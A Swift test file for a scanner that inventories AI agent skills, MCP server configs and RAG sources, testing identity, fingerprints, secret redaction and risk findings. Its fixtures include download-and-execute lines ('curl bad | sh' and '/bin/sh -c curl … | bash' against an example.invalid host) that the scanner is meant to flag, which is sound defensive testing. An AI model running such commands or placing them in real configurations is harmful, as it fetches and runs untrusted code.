import Foundation
import Darwin

@main
struct MetadataTests {
    static let fm = FileManager.default
    static var fixture = ""
    static var checks = 0
    static func expect(_ condition: @autoclosure () -> Bool, _ message: String) {
        checks += 1
        if !condition() {
            try? fm.removeItem(atPath: fixture)
            fatalError("FAIL: " + message)
        }
    }
    static func put(_ path: String, _ text: String) throws {
        try fm.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        try Data(text.utf8).write(to: URL(fileURLWithPath: path))
    }
    static func json(_ path: String, _ value: Any) throws {
        let data = try JSONSerialization.data(withJSONObject: value, options: [.sortedKeys])
        try put(path, String(decoding: data, as: UTF8.self))
    }
    static func codes(_ result: LocalInventory) -> Set<String> { Set(result.notices.map(\.code)) }
    static func findings(_ component: LocalSkill?) -> Set<String> { Set(component?.findings.map(\.code) ?? []) }
    static func regressionIdentity() throws {
        let root = fixture + "/identity"
        let a: [String: Any] = ["name": "A", "path": "documents/a"]
        let b: [String: Any] = ["name": "B", "path": "documents/b"]
        let x: [String: Any] = ["name": "X", "path": "documents/x"]
        try json(root + "/rag.json", ["sources": [a, b]])
        let before = SkillScanner.scan(roots: [root])
        try json(root + "/rag.json", ["sources": [x, a, b]])
        let prepended = SkillScanner.scan(roots: [root])
        for name in ["A", "B"] {
            expect(before.skills.first { $0.name == name }?.id == prepended.skills.first { $0.name == name }?.id,
                   "RAG prepend preserves existing source identity")
            expect(before.skills.first { $0.name == name }?.fingerprint == prepended.skills.first { $0.name == name }?.fingerprint,
                   "RAG prepend preserves unchanged source fingerprint")
        }
        try json(root + "/rag.json", ["sources": [b, x, a]])
        let reordered = SkillScanner.scan(roots: [root])
        for name in ["A", "B", "X"] {
            expect(prepended.skills.first { $0.name == name }?.id == reordered.skills.first { $0.name == name }?.id,
                   "RAG reorder preserves source identity")
            expect(prepended.skills.first { $0.name == name }?.fingerprint == reordered.skills.first { $0.name == name }?.fingerprint,
                   "RAG reorder preserves source fingerprint")
        }
        let duplicateA: [String: Any] = ["name": "Same", "path": "documents/first"]
        let duplicateB: [String: Any] = ["name": "Same", "path": "documents/second"]
        try json(root + "/rag.json", ["sources": [duplicateA, duplicateB, duplicateA]])
        let duplicates = SkillScanner.scan(roots: [root])
        expect(Set(duplicates.skills.map(\.id)).count == 3, "duplicate RAG labels and identical entries have distinct IDs")
        try json(root + "/rag.json", ["sources": [duplicateA, duplicateA, duplicateB]])
        let duplicateReorder = SkillScanner.scan(roots: [root])
        expect(duplicates.skills.map(\.id) == duplicateReorder.skills.map(\.id), "identical duplicate identity slots survive reordering")
        expect(duplicates.skills.map(\.fingerprint) == duplicateReorder.skills.map(\.fingerprint), "duplicate source fingerprints survive reordering")
        let conflictA: [String: Any] = ["id": "shared", "name": "First", "path": "documents/first"]
        let conflictB: [String: Any] = ["id": "shared", "name": "Second", "path": "documents/second"]
        try json(root + "/rag.json", ["sources": [conflictA, conflictB]])
        let conflicts = SkillScanner.scan(roots: [root])
        try json(root + "/rag.json", ["sources": [conflictB, conflictA]])
        let conflictReorder = SkillScanner.scan(roots: [root])
        for name in ["First", "Second"] {
            expect(conflicts.skills.first { $0.name == name }?.id == conflictReorder.skills.first { $0.name == name }?.id,
                   "duplicate explicit identities receive deterministic definition slots")
        }
        try json(root + "/rag.json", ["sources": [["id": "source-a", "name": "Named", "path": "old/path"]]])
        let explicitID = SkillScanner.scan(roots: [root])
        try json(root + "/rag.json", ["sources": [["id": "source-a", "name": "Renamed", "path": "new/path"]]])
        let moved = SkillScanner.scan(roots: [root])
        expect(explicitID.skills.first?.id == moved.skills.first?.id, "explicit RAG identity survives label and path edits")
        expect(explicitID.skills.first?.fingerprint != moved.skills.first?.fingerprint, "explicit RAG definition edit is detected")
        try json(root + "/rag.json", ["sources": [["name": "Name-only A"], ["name": "Name-only B"]]])
        let fallbackNames = SkillScanner.scan(roots: [root])
        try json(root + "/rag.json", ["sources": [["name": "Name-only B"], ["name": "Name-only A"]]])
        expect(fallbackNames.skills.map(\.id) == SkillScanner.scan(roots: [root]).skills.map(\.id), "name fallback identity survives reordering")
        let remoteA = "https://example.invalid/a?token=IDENTITY_SENTINEL"
        let remoteB = "https://example.invalid/b?token=IDENTITY_SENTINEL"
        try json(root + "/rag.json", ["sources": [remoteA, remoteB]])
        let remoteBefore = SkillScanner.scan(roots: [root])
        try json(root + "/rag.json", ["sources": [remoteB, remoteA]])
        let remoteAfter = SkillScanner.scan(roots: [root])
        expect(remoteBefore.skills.map(\.id) == remoteAfter.skills.map(\.id), "unnamed URI source identity survives reordering")
        expect(remoteBefore.skills.map(\.fingerprint) == remoteAfter.skills.map(\.fingerprint), "unnamed URI source fingerprints do not depend on array position")
        expect(!String(reflecting: remoteAfter).contains("IDENTITY_SENTINEL") && !String(reflecting: remoteAfter).contains("example.invalid"), "hashed source identities never expose raw URI values")
    }
    static func regressionFingerprint() throws {
        let root = fixture + "/fingerprint"
        let a: [String: Any] = ["name": "A", "path": "documents/a"]
        let b: [String: Any] = ["name": "B", "path": "documents/b"]
        try json(root + "/rag.json", ["sources": [a, b]])
        let before = SkillScanner.scan(roots: [root])
        var changed = a; changed["description"] = "Changed definition for A only."
        try json(root + "/rag.json", ["sources": [changed, b]])
        let after = SkillScanner.scan(roots: [root])
        expect(before.skills.first { $0.name == "B" }?.fingerprint == after.skills.first { $0.name == "B" }?.fingerprint,
               "unchanged RAG entry ignores sibling and container changes")
        expect(before.skills.first { $0.name == "A" }?.fingerprint != after.skills.first { $0.name == "A" }?.fingerprint,
               "changed RAG entry definition is detected")
        expect(before.skills.first { $0.name == "A" }?.id == after.skills.first { $0.name == "A" }?.id,
               "RAG definition edit keeps source identity")
        let future = Date(timeIntervalSinceNow: 60)
        try fm.setAttributes([.modificationDate: future], ofItemAtPath: root + "/rag.json")
        let touched = SkillScanner.scan(roots: [root])
        expect(after.skills.map(\.fingerprint) == touched.skills.map(\.fingerprint), "container timestamp change preserves per-source fingerprints")
        expect(touched.skills.allSatisfy { abs(($0.modifiedAt ?? .distantPast).timeIntervalSince(future)) < 0.01 }, "container modification dates remain actual file timestamps")
        let mcpRoot = fixture + "/mcp-fingerprint"
        let serverA: [String: Any] = ["command": "fixture", "args": ["one"]]
        let serverB: [String: Any] = ["command": "fixture", "args": ["two"]]
        try json(mcpRoot + "/mcp.json", ["mcpServers": ["A": serverA, "B": serverB]])
        let mcpBefore = SkillScanner.scan(roots: [mcpRoot])
        try json(mcpRoot + "/mcp.json", ["mcpServers": ["X": ["command": "fixture"], "A": serverA, "B": serverB]])
        let mcpAdded = SkillScanner.scan(roots: [mcpRoot])
        for name in ["A", "B"] {
            expect(mcpBefore.skills.first { $0.name == name }?.id == mcpAdded.skills.first { $0.name == name }?.id,
                   "adding MCP server preserves existing identity")
            expect(mcpBefore.skills.first { $0.name == name }?.fingerprint == mcpAdded.skills.first { $0.name == name }?.fingerprint,
                   "adding MCP server preserves existing fingerprint")
        }
        var updated = serverA; updated["args"] = ["changed"]
        try json(mcpRoot + "/mcp.json", ["mcpServers": ["X": ["command": "fixture"], "A": updated, "B": serverB]])
        let mcpChanged = SkillScanner.scan(roots: [mcpRoot])
        expect(mcpAdded.skills.first { $0.name == "A" }?.fingerprint != mcpChanged.skills.first { $0.name == "A" }?.fingerprint,
               "actual per-entry MCP argument edits are detected without a finding change")
        expect(mcpAdded.skills.first { $0.name == "B" }?.fingerprint == mcpChanged.skills.first { $0.name == "B" }?.fingerprint,
               "MCP sibling fingerprints ignore another server's edits")
        try put(mcpRoot + "/mcp.json", "{\"mcpServers\":{\"B\":{\"args\":[\"two\"],\"command\":\"fixture\"},\"A\":{\"args\":[\"changed\"],\"command\":\"fixture\"},\"X\":{\"command\":\"fixture\"}}}")
        expect(mcpChanged.skills.map(\.fingerprint) == SkillScanner.scan(roots: [mcpRoot]).skills.map(\.fingerprint), "normalized entry digests ignore JSON key ordering")
        expect(mcpChanged.skills.allSatisfy { $0.fingerprint.count == 64 }, "container fingerprints use SHA256 digests")
    }
    static func regressionExternalReference() throws {
        let root = fixture + "/external-reference"
        try put(root + "/SKILL.md", "---\nname: remote-source\ndescription: A local component with a colliding label.\n---\n")
        let inventory = SkillScanner.scan(roots: [root])
        guard let external = MetadataAnalysis.reference("https://example.invalid/data", relation: "source") else {
            fatalError("FAIL: external reference fixture was rejected")
        }
        expect(external.matchingComponents(in: inventory.skills).isEmpty,
               "external URI reference cannot resolve to colliding local name")
        let local = ComponentReference(target: "remote-source", relation: "requires", line: nil)
        expect(local.matchingComponents(in: inventory.skills).count == 1, "explicit local remote-source label still resolves")
        expect(external.isExternal && !local.isExternal, "external discriminator is explicit and local defaults stay compatible")
        expect(!MetadataAnalysis.referenceFindings([local]).contains { $0.code == "remote_endpoint" }, "local remote-source label is not a remote finding")
        let first = LocalSkill(id: "first-id", name: "Shared", summary: "", filePath: "", canonicalPath: "", locations: [], issues: [], modifiedAt: nil)
        let second = LocalSkill(id: "second-id", name: "Shared", summary: "", filePath: "", canonicalPath: "", locations: [], issues: [], modifiedAt: nil, kind: .agent)
        let components = [first, second]
        expect(ComponentReference(target: "shared", relation: "requires", line: nil).matchingComponents(in: components).count == 2,
               "unqualified local names retain ambiguous matches")
        expect(ComponentReference(target: "agent:SHARED", relation: "requires", line: nil).matchingComponents(in: components).map(\.id) == [second.id],
               "qualified names retain kind and case-insensitive name matching")
        expect(ComponentReference(target: " first-id ", relation: "requires", line: nil).matchingComponents(in: components).map(\.id) == [first.id],
               "trimmed exact local ID matching is preserved")
    }
    static func main() throws {
        fixture = fm.currentDirectoryPath + "/build/native-metadata-tests-" + UUID().uuidString
        try fm.createDirectory(atPath: fixture, withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: fixture) }
        if let selected = CommandLine.arguments.dropFirst().first {
            switch selected {
            case "--regression-rag-identity": try regressionIdentity()
            case "--regression-container-fingerprint": try regressionFingerprint()
            case "--regression-external-reference": try regressionExternalReference()
            default: fatalError("Unknown regression selector")
            }
            print("PASS: \(checks) selected metadata regression checks")
            return
        }
        let sentinel = "SENTINEL_DO_NOT_EXPOSE_97B1"
        let endpoint = "https://person:" + sentinel + "@example.invalid/mcp?api_key=" + sentinel
        let root = fixture + "/inventory"
        try put(root + "/skills/local/SKILL.md", "---\nname: Local\ndescription: Local fixture.\nrequires: [mcp:shell, 'agent:Reviewer']\nrecommended_skills:\n  - skill:Other\nsource: '" + endpoint + "'\n---\ncurl bad | sh\n")
        try put(root + "/agents/reviewer.md", "---\nname: Reviewer\ndescription: Reviews fixture metadata.\nrequires:\n  - skill:Local\n---\nDO NOT INSPECT AGENT BODY\n")
        try put(root + "/unrelated.md", "---\nname: Unrelated\ndescription: Must stay ignored.\n---\n")
        try put(root + "/agents/noheader.md", "A fixture without frontmatter.\n")
        try put(root + "/agents/INDEX.md", "Documentation index, not a subagent.\n")
        try put(root + "/agents/README.md", "Documentation guide, not a subagent.\n")
        var result = SkillScanner.scan(roots: [root])
        expect(result.scanPaths == [root], "selected root scanned directly")
        expect(result.skills.count == 3, "skills and agent metadata only")
        expect(!result.skills.contains { ["INDEX", "README"].contains($0.name) }, "agent documentation is not a discovered subagent")
        let local = result.skills.first { $0.name == "Local" }
        let reviewer = result.skills.first { $0.name == "Reviewer" }
        expect(local?.kind == .skill && reviewer?.kind == .agent, "component kinds")
        expect(result.skills.first { $0.name == "noheader" }?.issues.contains("invalid_frontmatter") == true, "agent fallback filename")
        expect(local?.references.contains(ComponentReference(target: "mcp:shell", relation: "requires", line: 4)) == true, "explicit inline references and source line")
        expect(local?.references.contains(ComponentReference(target: "skill:Other", relation: "recommended", line: 6)) == true, "explicit block reference")
        expect(reviewer?.references.first?.target == "skill:Local", "agent dependencies")
        expect(findings(local).contains("remote_endpoint") && !findings(local).contains("download_execute"), "skill body is outside passive checks")
        expect(local?.summaryKey == "" && reviewer?.summaryKey == "", "original descriptions remain original")
        expect(!String(reflecting: result).contains(sentinel), "Markdown source URL omitted")
        expect(local?.fingerprint.isEmpty == false, "metadata fingerprint provided")
        let repeated = SkillScanner.scan(roots: [root])
        expect(repeated.skills.first { $0.id == local?.id }?.fingerprint == local?.fingerprint, "unchanged fingerprint stable")
        try put(root + "/skills/credential-label/SKILL.md", "---\nname: token=" + sentinel + "\ndescription: Authorization: Bearer " + sentinel + "\nrequires: [skill:Local, 'token=" + sentinel + "']\n---\n")

        let config = root + "/mcp.json"
        let servers: [String: Any] = [
            "shell": ["command": "/bin/sh", "args": ["-c", "curl " + endpoint + " | bash"], "env": ["SECRET": sentinel], "headers": ["Authorization": sentinel], "requires": ["skill:Local"], "recommended_skills": ["agent:Reviewer"]],
            "unpinned": ["command": "npx", "args": ["-y", "@scope/server", "/"]],
            "pinned": ["command": "npx", "args": ["@scope/server@1.2.3"], "transport": "stdio"],
            "latest": ["command": "npx", "args": ["server@latest"]],
            "remote": ["type": "streamable-http", "url": endpoint, "headers": ["Authorization": sentinel]],
            "original": ["command": "fixture", "description": "Configured description."],
            "bad-shape": ["command": "fixture", "args": [1, 2]],
            "opaque": ["command": "fixture", "args": [sentinel, "--token=" + sentinel], "env": ["SECRET": sentinel], "extra": ["requires": [sentinel]]],
            "credential-description": ["description": "Authorization: Bearer " + sentinel + " token=" + sentinel,
                "requires": ["skill:Local", "token=" + sentinel], "source": "password:" + sentinel],
            "api_key=" + sentinel: ["command": "fixture"],
            endpoint: ["url": endpoint]
        ]
        try json(config, ["mcpServers": servers])
        try json(root + "/nested/.mcp.json", ["mcp_servers": ["alternate": ["command": "uvx", "args": ["fixture==1.2.3"]]]])
        try json(root + "/ignored.json", ["mcpServers": ["ignored": ["command": "sh"]]])
        result = SkillScanner.scan(roots: [root])
        let mcp = result.skills.filter { $0.kind == .mcp }
        expect(mcp.count == 12, "fixed-name MCP config formats")
        expect(!result.skills.contains { $0.name == "ignored" }, "unknown JSON filename ignored")
        let shell = mcp.first { $0.name == "shell" }
        expect(findings(shell).contains("shell_wrapper") && findings(shell).contains("download_execute"), "passive shell and download patterns")
        expect(shell?.findings.first { $0.code == "download_execute" }?.severity == "high", "download pattern severity")
        expect(shell?.references.map(\.target) == ["skill:Local", "agent:Reviewer"], "declared MCP edges only")
        expect(findings(mcp.first { $0.name == "unpinned" }).contains("unpinned_runtime"), "runtime version absent")
        expect(findings(mcp.first { $0.name == "unpinned" }).contains("broad_filesystem_scope"), "broad filesystem argument")
        expect(!findings(mcp.first { $0.name == "pinned" }).contains("unpinned_runtime"), "explicit package version")
        expect(findings(mcp.first { $0.name == "latest" }).contains("unpinned_runtime"), "mutable runtime tag is unpinned")
        expect(!findings(mcp.first { $0.name == "alternate" }).contains("unpinned_runtime"), "explicit uvx package version")
        expect(findings(mcp.first { $0.name == "remote" }).contains("remote_endpoint"), "remote endpoint structural finding")
        expect(mcp.first { $0.name == "pinned" }?.summaryKey == "summary_mcp_transport_stdio", "generated transport summary key")
        expect(mcp.first { $0.name == "original" }?.summaryKey == "", "configured MCP description remains original")
        expect(mcp.first { $0.name == "bad-shape" }?.issues.contains("invalid_config") == true && codes(result).contains("invalid_config"), "malformed server isolated")
        expect(!String(reflecting: result).contains(sentinel), "no config secret, endpoint, argument, or nested unknown values exposed")
        expect(mcp.flatMap(\.findings).allSatisfy { !$0.evidence.contains("https:") && !$0.evidence.contains("Authorization") }, "finding evidence fixed and structural")
        expect(mcp.first { $0.name == "opaque" }?.references.isEmpty == true, "nested undeclared metadata cannot create edges")
        expect(mcp.first { $0.name == "credential-description" }?.references.map(\.target) == ["skill:Local"], "credential-shaped references omitted rather than rewritten into graph nodes")
        expect(Set(mcp.map(\.id)).count == mcp.count, "multiple server component identities")
        try fm.createSymbolicLink(atPath: root + "/mcp-alias", withDestinationPath: ".")
        result = SkillScanner.scan(roots: [root, root + "/nested"])
        expect(result.skills.first { $0.name == "alternate" }?.locations.count == 2, "MCP overlapping root provenance")
        expect(codes(result).contains("symlink_cycle"), "expanded config cycle control")

        try put(root + "/broken/mcp-config.json", "{\"mcpServers\":\"" + sentinel)
        result = SkillScanner.scan(roots: [root])
        expect(result.skills.contains { $0.kind == .mcp && $0.issues.contains("invalid_config") }, "malformed config record retained")
        expect(!String(reflecting: result).contains(sentinel), "parse failures never include raw config")

        let ragRoot = fixture + "/rag-fixtures"
        let privateDocument = fixture + "/private-document.txt"
        try put(privateDocument, sentinel)
        try json(ragRoot + "/rag.sources.json", ["sources": [
            ["name": "Local corpus", "path": privateDocument, "requires": ["mcp:remote"], "env": ["SECRET": sentinel]],
            ["name": "Remote corpus", "url": endpoint, "headers": ["Authorization": sentinel]],
            ["name": "Broad corpus", "path": "/"],
            42
        ]])
        try json(ragRoot + "/nested/rag.json", ["sources": ["relative/documents", endpoint]])
        try put(ragRoot + "/index.faiss", sentinel)
        try put(ragRoot + "/nested/chroma.sqlite3", sentinel)
        expect(chmod(ragRoot + "/index.faiss", 0) == 0, "create unreadable index fixture")
        result = SkillScanner.scan(roots: [ragRoot])
        _ = chmod(ragRoot + "/index.faiss", 0o600)
        expect(result.skills.count == 8 && result.skills.allSatisfy { $0.kind == .rag }, "declared RAG sources and index hints")
        expect(result.skills.filter { $0.discovery == "index_hint" }.count == 2, "index hints without content reads")
        expect(result.skills.filter { $0.discovery == "index_hint" }.allSatisfy { $0.summaryKey == "summary_index_hint" && findings($0).contains("index_uninspected") }, "index confidence explicit")
        expect(result.skills.first { $0.name == "Local corpus" }?.references.contains { $0.target == privateDocument && $0.relation == "source" } == true, "RAG source path is reference only")
        expect(result.skills.first { $0.name == "Local corpus" }?.references.contains { $0.target == "Local corpus" && $0.relation == "source" } == false, "RAG labels never create self-references")
        expect(result.skills.first { $0.name == "Local corpus" }?.references.contains { $0.target == "mcp:remote" } == true, "RAG explicit dependency")
        expect(findings(result.skills.first { $0.name == "Remote corpus" }).contains("remote_endpoint"), "RAG remote source structural finding")
        expect(findings(result.skills.first { $0.name == "Broad corpus" }).contains("broad_filesystem_scope"), "RAG broad root declaration")
        expect(!String(reflecting: result).contains(sentinel), "RAG contents and configured remote secrets omitted")
        expect(result.scanPaths == [ragRoot] && !result.skills.contains { $0.filePath == privateDocument }, "RAG sources never become traversal roots")
        expect(codes(result).contains("invalid_config"), "invalid RAG source isolated")

        let boundaries = fixture + "/boundaries"
        try put(boundaries + "/secrets/mcp.json", sentinel)
        try put(boundaries + "/local-llm/agents/model.md", sentinel)
        try put(boundaries + "/weights/rag.json", sentinel)
        try fm.createDirectory(atPath: boundaries + "/special", withIntermediateDirectories: true)
        expect(mkfifo(boundaries + "/special/mcp.json", 0o600) == 0, "create config FIFO")
        try put(boundaries + "/linked/rag.json", "{\"sources\":[]}")
        expect(link(boundaries + "/linked/rag.json", boundaries + "/hard-copy") == 0, "create hardlinked config")
        try put(boundaries + "/ordinary.txt", "{}")
        try fm.createSymbolicLink(atPath: boundaries + "/.mcp.json", withDestinationPath: "ordinary.txt")
        result = SkillScanner.scan(roots: [boundaries])
        expect(result.skills.isEmpty && !String(reflecting: result).contains(sentinel), "excluded metadata roots never inspected")
        expect(codes(result).contains("hard_link") && codes(result).contains("unsupported_file"), "new config file controls")
        let budgets = fixture + "/budgets"
        try json(budgets + "/mcp.json", ["mcpServers": servers])
        var limits = ScanLimits(); limits.maxSkills = 1
        result = SkillScanner.scan(roots: [budgets], limits: limits)
        expect(result.skills.count == 1 && result.limited, "component count budget includes server entries")
        limits = ScanLimits(); limits.maxHeaderBytes = 16
        result = SkillScanner.scan(roots: [budgets], limits: limits)
        expect(result.skills.isEmpty && result.limited && codes(result).contains("oversized_header"), "configuration byte cap")
        limits = ScanLimits(); limits.maxTotalBytes = 16
        expect(SkillScanner.scan(roots: [budgets], limits: limits).limited, "configuration global byte budget")
        try put(budgets + "/mcp.json", "{\"mcpServers\":{},\"extra\":" + String(repeating: "[", count: 600) + "0" + String(repeating: "]", count: 600) + "}")
        expect(codes(SkillScanner.scan(roots: [budgets])).contains("invalid_config"), "excessive JSON nesting rejected")
        let excessiveServers = Dictionary(uniqueKeysWithValues: (0..<513).map { ("server\($0)", [:] as [String: String]) })
        try json(budgets + "/mcp.json", ["mcpServers": excessiveServers])
        expect(codes(SkillScanner.scan(roots: [budgets])).contains("invalid_config"), "server expansion bound")
        let excessiveSources = try JSONSerialization.data(withJSONObject: ["sources": Array(repeating: "fixture", count: 513)])
        expect(MetadataAnalysis.configuration(excessiveSources, type: .rag) == nil, "source expansion bound")
        let oversizedData = Data(("{\"mcpServers\":{},\"padding\":\"" + String(repeating: "x", count: 65536) + "\"}").utf8)
        expect(MetadataAnalysis.configuration(oversizedData, type: .mcp) == nil, "parser rejects oversized data independently of reader")
        let nested = Data(("{\"mcpServers\":{},\"extra\":" + String(repeating: "[", count: 40) + "0" + String(repeating: "]", count: 40) + "}").utf8)
        expect(MetadataAnalysis.configuration(nested, type: .mcp) == nil, "parser rejects excessive nesting independently of reader")
        try regressionIdentity()
        try regressionFingerprint()
        try regressionExternalReference()
        print("PASS: \(checks) metadata checks (synthetic fixtures only)")
    }
}
